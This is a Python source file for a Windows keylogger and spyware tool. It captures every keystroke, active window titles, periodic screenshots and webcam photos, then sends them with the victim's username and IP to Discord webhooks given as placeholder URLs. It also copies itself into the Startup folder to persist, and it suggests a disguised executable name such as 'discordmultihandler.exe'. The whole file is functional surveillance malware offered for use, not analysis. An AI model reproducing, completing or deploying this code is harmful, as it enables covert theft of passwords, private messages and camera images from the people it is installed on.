from discord_webhook import DiscordWebhook, DiscordEmbed
from pynput.keyboard import Listener
import threading
import win32gui
import getpass
import time
import os
import shutil
from pathlib import Path
import socket
import cv2
import pyautogui

global keylog,lim,tab,crpass,filenameforexe,version,path,screenshot_delay,camshot_delay
keylog = ""
filenameforexe = "final file name (ex. discordmultihandler.exe)"
lim = 1970 #How many characters will be sent when keylogging
LURL = "webhooklink1"
LURL2 = "webhooklink2"
LURL3 = "webhooklink3"
LNAME = getpass.getuser()
tab = "" 
path = "Path where the image will be saved"
screenshot_delay = 10 #screenshot_delay
camshot_delay = 10.25 #camshot_delay

def send(message,target) -> None:
    sendall = DiscordWebhook(url=target, content=message, username=socket.gethostbyname(socket.gethostname()) + " " + LNAME)
    sendall.execute()

def send_image_to_discord1(image_file, url):
    try:
        webhook = DiscordWebhook(url=url,content = "@IMAGE1 |",username=socket.gethostbyname(socket.gethostname()) + " " + LNAME)
        now = time.localtime()
        with open(f"{image_file}", "rb") as f:
            webhook.add_file(file=f.read(), filename=image_file)
        webhook.execute()
    except:
        logging("@ERROR | sending screenshot is Fail")
def send_image_to_discord2(image_file, url):
    try:
        webhook = DiscordWebhook(url=url,content= "@IMAGE2 |",username=socket.gethostbyname(socket.gethostname()) + " " + LNAME)
        now = time.localtime()
        with open(f"{image_file}", "rb") as f:
            webhook.add_file(file=f.read(), filename=image_file)
        webhook.execute()
    except:
        logging("@ERROR | sending screenshot is Fail")
        
def logging(message):
    now = time.localtime()
    message = f"{message} | {now.tm_year}/{now.tm_mon}/{now.tm_mday} {now.tm_hour}:{now.tm_min}:{now.tm_sec}"
    send(message,LURL3)
    
def on_press(Key):
    global keylog, lim
    try:
        if len(keylog) < lim:
            keylog = keylog + "." + str(Key).replace("'","")
        elif len(keylog) >= lim:
            send("@KEYLOG | "+keylog,LURL)
            logging("@SUCCESS | KeyLogging is send")
            keylog = ""
    except:
        logging("@ERROR | KeyLogging is Fail")

def listener_c():
    with Listener(on_press=on_press) as listener:
        listener.join()

def startup():
    global filenameforexe,path
    r_path = ""
    for i in __file__.split("\\")[:len(__file__.split("\\"))-2]:
        r_path = f"{r_path}{i}\\"
    r_path = r_path + __file__.split("\\")[len(__file__.split("\\"))-2]
    PATH = f"C:\\Users\\{LNAME}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
    end_PATH = str(Path.cwd()) + "\\" + filenameforexe
    if not os.path.isdir(path):
        os.mkdir("image")
        logging(f"@SUCCESS | {r_path}\\{path} is maked")
    if os.path.isdir(PATH):
        try:
            shutil.copy(end_PATH,PATH)
            logging(f"@SUCCESS | copy_move {end_PATH} -> {PATH}" + "\\")
        except:
            logging(f"@ERROR | copy_move {end_PATH} -> {PATH} is fail")
    else:
        logging(f"@ERROR | copy_move {end_PATH} -> {PATH} is fail cause dir isn't there")

def Tab():
    global tab
    try:
        if tab != win32gui.GetWindowText(win32gui.GetForegroundWindow()):
            tab = win32gui.GetWindowText(win32gui.GetForegroundWindow())
            send("@TABLOG "+tab,LURL2)
    except:
        logging("@ERROR | TabLogging is Fail")

def whiling():
    while True:
        Tab()
        time.sleep(0.01)

def screenshot():
    global path
    try:
        pyautogui.screenshot(f"{path}\\screenshot.jpg")
        send_image_to_discord2(f"{path}\\screenshot.jpg",LURL3)
        os.remove(f"{path}\\screenshot.jpg")
    except:
        logging("@ERROR | Get ScreenShot is Fail")

def camshoot():
    global path
    try:
        try:
            cap = cv2.VideoCapture(0)  
        except:
            logging("@ERROR | This Computer hasn't cam")
        cap.set(3, 640)  
        cap.set(4, 480)  
        ret, frame = cap.read()  
        frame = cv2.flip(frame, 1)  
        cv2.imwrite(f"{path}\\camshoot.jpg", frame) 
        cap.release()
        cv2.destroyAllWindows()
        send_image_to_discord1(f"{path}\\camshoot.jpg",LURL3)
        os.remove(f"{path}\\camshoot.jpg")
    except:
        logging("@ERROR | CamShoot is Fail")

def listener_screenshot():
    global screenshot_delay
    while True:
        screenshot()
        time.sleep(screenshot_delay)

def listener_camshot():
    global camshot_delay
    while True:
        camshoot()
        time.sleep(camshot_delay)

def Get_IP():
    logging(f"@Grabbing | {socket.gethostbyname(socket.gethostname())}")

def main():
    startup()
    Get_IP()
    threading.Thread(target=listener_c).start()
    threading.Thread(target=whiling).start()
    threading.Thread(target=listener_screenshot).start()
    threading.Thread(target=listener_camshot).start()

if __name__ == '__main__':
    main()
